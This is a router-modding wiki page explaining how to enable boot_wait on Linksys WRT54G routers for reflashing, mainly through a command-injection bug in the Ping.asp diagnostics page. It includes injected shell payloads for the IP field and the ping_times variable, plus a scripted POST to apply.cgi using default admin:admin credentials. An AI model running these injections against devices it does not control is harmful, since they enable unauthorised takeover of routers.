= Ping.asp Bug =

If the boot_wait variable is set, the bootup process is delayed by few seconds allowing a new firmware to be installed through the bootloader using tftp. Setting of the boot_wait variable is done through a bug in the Ping.asp administration page by pinging the certain "addresses" listed below.  '''You find ping.asp by navigating through the administration page and selecting diagnostics.'''.

First, for this to work the '''internet port must have a valid ip address''', either from DHCP or manually configured from the main page - the port itself doesn't need to be connected unless using dhcp. Next, navigate to the Ping.asp page and enter exactly each line listed below, one line at a time into the "IP Address" field, pressing the Ping button after each entry.

{{{
;*/n${IFS}set${IFS}boot_wait=on
;*/n${IFS}commit
;*/n${IFS}show>tmp/ping.log
}}}

When you get to the last command the ping window should be filled with a long list of variables including '''boot_wait=on''' somewhere in that list.

This ping exploit definitely works with ALL WRT54G VERSIONS. You must have an address on the WAN port. In the Setup/Basic Setup/Internet Setup section you may wish to select Static IP and set IP=10.0.0.1, Mask=255.0.0.0, Gateway=10.0.0.2. Those values are meaningless; you'll be overwriting them soon with new firmware. Note: flashing a Linksys WRT54GS v1.1 by using TFTP is only possible using the Port 1 of the switch!

You can also use the [https://aachen.uni-dsl.de/download/wrt/Snapshots/rev121/buildroot-rev121/takeover takeover] script to make ping hack in a single command (need a shell command line interpreter). This script expects to find the to-be flashed firmware in a file called '''openwrt-g-code.bin''', which is in the ''current'' directory.

There is another bug still present in Ping.asp (firmware revision 3.03.1) where you can put your shell code into the ping_times variable. See http://www.linksysinfo.org/modules.php?name=Forums&file=viewtopic&t=448 This means you don't have to downgrade your firmware first and it removes the input size restrictions so you can use more obvious shell commands like:

{{{
`/usr/sbin/nvram set boot_wait=on`
`/usr/sbin/nvram commit`
`/usr/sbin/nvram show > /tmp/ping.log`
}}}

For instance, if you are in Unix and have Perl and LWP installed, you may issue this command:

{{{
echo 'submit_button=Ping&submit_type=start&action=Apply&change_action=gozila_cgi&ping_ip=10.0.0.1&ping_times=`/usr/sbin/nvram show > /tmp/ping.log`'|POST -C admin:admin http://192.168.1.1/apply.cgi
}}}


= Via serial console =

With a serial connection to your WRT, you don't have to use the ping bug or change your Linksys firmware. You can set boot_wait from the console, using the commands

{{{
#nvram set boot_wait=on
#nvram get boot_wait           (just to confirm, should respond with "on")
#nvram commit                  (takes a few seconds to complete)
}}}

You can also set boot_wait from the CFE boot loader (to enter CFE, reboot the router with "# reboot" while hitting {{{CTRL-C}}} continously)

{{{
CFE> nvram set boot_wait=on
CFE> nvram get boot_wait       (just to confirm, should respond with "on")
CFE> nvram commit              (takes a few seconds to complete)
}}}

Or via PMON (older models, hit {{{CTRL-C}}} repeatedly during powerup or reboot)

{{{
PMON> set boot_wait on
PMON> set nvram boot_wait
}}}
